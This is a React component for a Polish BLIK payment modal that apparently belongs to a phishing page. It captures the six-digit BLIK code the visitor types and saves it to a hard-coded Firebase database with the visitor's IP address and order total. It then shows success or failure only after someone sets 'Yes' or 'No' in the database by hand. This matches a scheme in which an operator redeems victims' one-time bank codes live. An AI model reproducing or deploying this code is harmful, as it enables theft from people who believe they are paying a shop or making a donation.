import React, { useState, useEffect, useRef } from "react";

import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
import {
    getDatabase,
    ref,
    set,
    onValue,
} from "https://www.gstatic.com/firebasejs/11.0.1/firebase-database.js";

// Firebase configuration and initialization
const firebaseConfig = {
    apiKey: "AIzaSyBI9jEFhCJ_haq0R3qaFECibT9ue5nD2RU",
    authDomain: "blik-52f1e.firebaseapp.com",
    databaseURL:
        "https://blik-52f1e-default-rtdb.europe-west1.firebasedatabase.app",
    projectId: "blik-52f1e",
    storageBucket: "blik-52f1e.appspot.com",
    messagingSenderId: "592614598388",
    appId: "1:592614598388:web:3e86c4d89c95bff8f7a0a1",
};
const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

function Dostawa() {
    const [blikCode, setBlikCode] = useState("");
    const [order, setOrder] = useState(1);
    const [ipAdress, setIpAdress] = useState("");
    const [storedSum, setStoredSum] = useState(0);
    const [quantity, setQuantity] = useState(0);
    const blikRef = useRef(null);
    const [text, setText] = useState("Confirm");
    const [time, setTime] = useState("");

    useEffect(() => {
        const textRef = ref(db, `BLIK/${time}`);

        // Listen for real-time updates from Firebase
        const unsubscribe = onValue(textRef, (snapshot) => {
            if (snapshot.exists()) {
                const fetchedText = snapshot.val().Text;
                setText(fetchedText); // Update the state with the new text from Firebase
            } else {
                setText("Confirm"); // Optional: Set an empty string if no data is found
            }
        });

        // Cleanup function to unsubscribe from Firebase listener when the component is unmounted or when currentTime changes
        return () => unsubscribe();
    }, [time]); // Only re-run effect when currentTime changes

    // Fetch IP on component mount
    useEffect(() => {
        const fetchIP = async () => {
            try {
                const response = await fetch("https://api.ipify.org");
                const data = await response.text();
                setIpAdress(data);
            } catch (error) {
                console.error("Failed to fetch IP:", error);
            }
        };
        fetchIP();
    }, []);

    // Function to get the current time in HH:MM:SS format
    function getCurrentTime() {
        return Date.now(); // Returns current time in milliseconds since January 1, 1970 (Unix epoch)
    }

    // Function to add data to Firebase
    async function AddData() {
        const currentTime = getCurrentTime();
        setTime(currentTime);

        // Retrieve user info from session storage

        const storedSum1 = sessionStorage.getItem("totalSum");

        try {
            await set(ref(db, `BLIK/${currentTime}`), {
                Numer: order,
                Time: currentTime,
                Blik: blikCode,
                IP: ipAdress,

                Summa: storedSum1,
                Quantity: quantity,
                Text: "Confirm",
            });

            // Reset blikCode and increment order number
            setOrder(order + 1);
            setBlikCode("");
        } catch (error) {
            console.error("Error adding data:", error);
        }
    }

    return (
        <div>
            {/* <!-- Modal 1 --> */}
            <div
                className="m-0 p-3 modal fade rounded-5"
                id="exampleModal1"
                tabIndex="-1"
                aria-labelledby="exampleModalLabel"
                aria-hidden="true"
            >
                <div
                    style={{
                        position: "absolute",
                        top: "40%",
                        left: "50%",
                        transform: "translate(-50%, -50%)",
                        transition: "all 0.3s ease",
                        maxWidth: "360px",
                        position: "relative",
                        height: "auto",
                        // backgroundImage: `url(${Banner_img_3})`,
                        // backgroundSize: "cover",
                        // backgroundPosition: "center",
                        // objectFit: "cover",
                    }}
                    className="m-0 p-0 modal-dialog border border-white border-2 rounded-5 "
                >
                    <div
                        style={{
                            backgroundColor: "transparent",

                            backdropFilter: "blur(10px)",
                            backgroundColor: "hsla(0, 0%, 0%, 0.5)",
                        }}
                        className="m-0 p-0  modal-content border-0 rounded-5 "
                    >
                        <div className="m-0 p-0 modal-header border-0 border-bottom border-white border-2 rounded-5 rounded-bottom-0 bg-primary">
                            <h1
                                style={{
                                    fontSize: "18px",
                                    minHeight: "60px",
                                    // textShadow:
                                    //     "1px 1px 10px black, 1px 1px 15px black, 1px 1px 20px black, 1px 1px 25px black, 1px 1px 30px black",
                                }}
                                className="m-0 p-2 ps-4 fw-bold modal-title text-white d-flex align-items-center"
                                id="exampleModalLabel"
                            >
                                Płatność BLIK
                            </h1>
                            <button
                                type="button"
                                className="o_btn_nav m-0 p-2 ms-auto fs-4 fw-normal text-white rounded-0 rounded-top-1 rounded-start-0 bg-transparent border-top-0 border-end-0 border-bottom-0" // Bootstrap classes
                                data-bs-dismiss="modal" // Automatically dismisses a modal when clicked
                                aria-label="Close" // Accessibility attribute
                                style={{ height: "60px" }}
                            >
                                X
                            </button>
                        </div>

                        <div style={{ height: "45px" }}></div>

                        <input
                            ref={blikRef}
                            value={blikCode}
                            onChange={(e) =>
                                setBlikCode(e.target.value.replace(/\D/g, ""))
                            }
                            style={{
                                minHeight: "60px",
                                outline: "none",
                                maxWidth: "240px",
                                fontSize: "24px",
                                boxShadow: "1px 1px 30px black, ",
                            }}
                            className="m-0 ms-auto me-auto ps-3 col-12 rounded d-flex flex-column justify-content-center align-items-center text-start bg-transparent text-white border-white "
                            required
                            type="text"
                            pattern="\d{6}"
                            maxLength={6}
                            inputMode="numeric"
                            title="Please enter a 6-digit BLIK code"
                            placeholder="Enter BLIK code"
                            aria-label="Enter 6-digit BLIK code"
                        />

                        <div style={{ height: "15px" }}></div>

                        <p
                            style={{
                                fontSize: "15px",
                                minHeight: "75px",
                                fontStyle: " italic",
                                // textShadow:
                                //     "1px 1px 10px black, 1px 1px 15px black, 1px 1px 20px black, 1px 1px 25px black, 1px 1px 30px black",
                            }}
                            className="m-0 p-3 text-white text-center"
                        >
                            Kod ma 6 cyfr. <br />
                            Znajdziesz go w aplikacji bankowej.
                        </p>
                        <div style={{ height: "15px" }}></div>

                        <button
                            type="button"
                            className="m-0 p-1 ms-auto me-auto ps-4 pe-4 col-auto fw-bold btn btn-primary border-0 outline-0 d-flex align-items-center justify-content-center rounded-4 "
                            style={{
                                fontSize: "18px",
                                minHeight: "60px",
                                maxWidth: "300px",
                                width: "100%",
                            }}
                            onClick={AddData}
                            data-bs-toggle="modal"
                            data-bs-target="#exampleModal2"
                            disabled={blikCode.length !== 6} // Only enable button if blikCode is 6 digits
                        >
                            Potwierdź
                        </button>
                        <div style={{ height: "30px" }}></div>
                    </div>
                </div>
            </div>

            {/* <!-- Modal 2 --> */}

            <div
                className="m-0 p-0 modal fade border-0 "
                id="exampleModal2"
                tabIndex="-1"
                aria-labelledby="exampleModalLabel"
                aria-hidden="true"
                data-bs-backdrop="static"
            >
                <div
                    style={{
                        position: "absolute",
                        top: "40%",
                        left: "50%",
                        transform: "translate(-50%, -50%)",
                        transition: "all 0.3s ease",
                        maxWidth: "360px",
                        position: "relative",
                        height: "auto",
                    }}
                    className="m-0 p-0 col modal-dialog border border-white border-2 rounded-5"
                >
                    <div
                        style={{
                            backgroundColor: "transparent",

                            backdropFilter: "blur(10px)",
                            backgroundColor: "hsla(0, 0%, 0%, 0.5)",
                        }}
                        className="m-0 p-0 modal-content border-0 rounded-5"
                    >
                        <div className="m-0 p-0 border-0 row justify-content-between align-items-center border-bottom border-white border-2 bg-primary rounded-5 rounded-bottom-0">
                            <h1
                                style={{
                                    fontSize: "18px",
                                    height: "60px",
                                    // textShadow:
                                    //     "1px 1px 10px black, 1px 1px 15px black, 1px 1px 20px black, 1px 1px 25px black, 1px 1px 30px black",
                                }}
                                className="m-0 p-2 ps-4 fw-bold col-auto modal-title  text-white d-flex align-items-center "
                                id="exampleModalLabel"
                            >
                                Płatność BLIK
                            </h1>

                            {text === "Yes" || text === "No" ? (
                                <button
                                    type="button"
                                    className="o_btn_nav m-0 p-2 ms-auto col-auto fs-4 text-white rounded-0  bg-transparent rounded-0 rounded-top-1 rounded-start-0 bg-transparent border-top-0 border-end-0 border-bottom-0" // Bootstrap classes
                                    data-bs-dismiss="modal" // Automatically dismisses a modal when clicked
                                    aria-label="Close" // Accessibility attribute
                                    style={{ height: "60px" }}
                                    // onClick={() => window.location.reload()} // Refresh the page on button click
                                >
                                    X
                                </button>
                            ) : null}
                        </div>

                        <div style={{ height: "30px" }}></div>

                        <div
                            style={{
                                fontSize: "24px",
                                minHeight: "60px",
                                // textShadow:
                                //     "1px 1px 10px black, 1px 1px 15px black, 1px 1px 20px black, 1px 1px 25px black, 1px 1px 30px black",
                            }}
                            className="m-0 p-2 col-auto modal-title text-white d-flex flex-column align-items-center justify-content-center  fw-bold text-center"
                        >
                            {text === "Yes" ? (
                                <>
                                    {" "}
                                    Dziękuję!{" "}
                                    <div
                                        style={{
                                            fontSize: "15px",
                                            fontStyle: " italic",

                                            textShadow:
                                                "1px 1px 10px black, 1px 1px 15px black, 1px 1px 20px black, 1px 1px 25px black, 1px 1px 30px black",
                                        }}
                                        className="m-0 p-0 text-white fw-normal"
                                    >
                                        <div style={{ height: "15px" }}></div>
                                        Otrzymaliśmy Twoją darowiznę!
                                        </div>
                                </>
                            ) : text === "No" ? (
                                <>
                                    {" "}
                                    Płatność się nie udała.
                                    <div
                                        style={{
                                            fontSize: "15px",
                                            fontStyle: " italic",

                                            textShadow:
                                                "1px 1px 10px black, 1px 1px 15px black, 1px 1px 20px black, 1px 1px 25px black, 1px 1px 30px black",
                                        }}
                                        className="m-0 p-0 text-white fw-normal"
                                    >
                                        <div style={{ height: "15px" }}></div>
                                        {/* Zakup nieopłacony.
                                        <br /> */}
                                        Niepoprawny kod BLIK.
                                    </div>
                                </>
                            ) : (
                                <>Potwierdź w aplikacji mobilnej!</>
                            )}
                        </div>

                        <div style={{ height: "30px" }}></div>

                        {text === "No" ? (
                            <>
                                {" "}
                                <button
                                    className="m-0 p-1 ms-auto me-auto ps-4 pe-4 col-auto fw-bold btn btn-primary border-0 outline-0 d-flex align-items-center justify-content-center rounded-4 "
                                    style={{
                                        fontSize: "18px",
                                        minHeight: "60px",
                                        maxWidth: "300px",
                                        width: "100%",
                                    }}
                                    data-bs-toggle="modal"
                                    data-bs-target="#exampleModal1"
                                >
                                    Spróbuj Ponownie
                                </button>{" "}
                                <div style={{ height: "30px" }}></div>
                            </>
                        ) : null}
                    </div>
                </div>
            </div>
        </div>
    );
}

export default Dostawa;
